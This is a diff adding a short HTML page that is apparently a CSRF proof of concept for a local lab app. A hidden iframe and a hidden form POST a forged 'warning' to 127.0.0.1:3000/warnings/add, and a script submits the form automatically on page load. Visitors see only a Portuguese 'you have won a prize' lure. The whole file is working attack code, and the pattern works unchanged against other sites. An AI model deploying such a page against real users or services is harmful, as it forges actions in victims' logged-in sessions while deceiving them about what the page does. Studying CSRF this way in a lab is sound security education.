@@ -1,0 +1,8 @@
+<iframe style="visibility: hidden;" name="myframe" id="frame1" src=""></iframe>
+<form style="visibility: hidden;" id="teste" method="POST" action="http://127.0.0.1:3000/warnings/add" target="myframe"><div> <label for="description">Aviso: </label><input id="description" type="text" name="description" value=""></div><button type="submit">Submit </button></form>
+<script>
+    let form1 = document.getElementById("teste");
+    document.getElementById("description").value = "Vunerability CRFS - Via arquivo";
+    form1.submit();
+</script>
+<p>Parabéns você foi premiado!!!!</p>
